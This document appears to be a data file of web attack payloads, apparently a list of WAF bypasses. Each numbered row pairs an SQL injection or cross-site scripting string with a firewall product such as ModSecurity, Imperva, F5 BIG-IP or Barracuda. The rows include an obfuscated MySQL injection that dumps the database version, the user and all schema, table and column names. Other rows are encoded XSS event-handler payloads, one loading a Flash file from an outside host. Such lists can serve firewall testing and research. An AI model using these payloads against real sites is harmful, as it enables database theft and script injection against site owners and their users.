111,"/*!00000concat*/(0x63726561746f723a2064705f6d6d78,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))",sql,modsecurity
112,<object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?,xss,modsecurity
113,0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user,sql,modsecurity
114,1 AND (select DCount(last(username)&after=1&after=1) from users where username=ad1min),sql,modsecurity
115,1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min'),sql,modsecurity
117,%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E,xss,imperva
118,<details ontoggle=alert(1)>,xss,webknight
119,"<div contextmenu=""xss"">Right-Click Here<menu id=""xss"" onshow=""alert(1)"">",xss,webknight
120,"<body style=""height:1000px"" onwheel=""[DATA]"">",xss,f5bigip
121,"<div contextmenu=""xss"">Right-Click Here<menu id=""xss"" onshow=""[DATA]"">",xss,f5bigip
122,"<body style=""height:1000px"" onwheel=""prom%25%32%33%25%32%36x70;t(1)"">",xss,f5bigip
123,"<div contextmenu=""xss"">Right-Click Here<menu id=""xss"" onshow=""prom%25%32%33%25%32%36x70;t(1)"">",xss,f5bigip
124,"<body style=""height:1000px"" onwheel=""alert(1)"">",xss,barracuda
125,"<div contextmenu=""xss"">Right-Click Here<menu id=""xss"" onshow=""alert(1)"">",xss,barracuda
126,<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>,xss,barracuda
127,<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>,xss,modsecurity
128,"?<input type=""search"" onsearch=""aler\u0074(1)"">",xss,quickdefense
129,<details ontoggle=alert(1)>,xss,quickdefense
